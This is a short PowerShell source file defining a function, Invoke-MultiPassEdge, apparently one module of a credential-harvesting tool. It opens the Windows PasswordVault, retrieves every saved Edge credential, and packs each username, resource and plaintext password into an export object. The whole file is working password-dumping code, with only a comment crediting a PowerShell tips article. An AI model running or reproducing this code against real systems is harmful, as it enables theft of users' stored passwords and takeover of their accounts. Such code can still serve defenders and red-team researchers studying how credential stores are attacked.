# https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/dumping-personal-passwords-from-windows
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
function Invoke-MultiPassEdge {
    $export = New-Object MultiPassExport
    $export.category = "Browser"
    $export.software = "Edge"
    $counter = 0
    foreach($cred in (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll())
            {
                $cred.RetrievePassword()
                $export.data["creds:${counter}:Username"] = $cred.Username
                $export.data["creds:${counter}:Resource"] = $cred.Resource
                $export.data["creds:${counter}:Password"] = $cred.Password
                $counter++
            }
    return $export
}
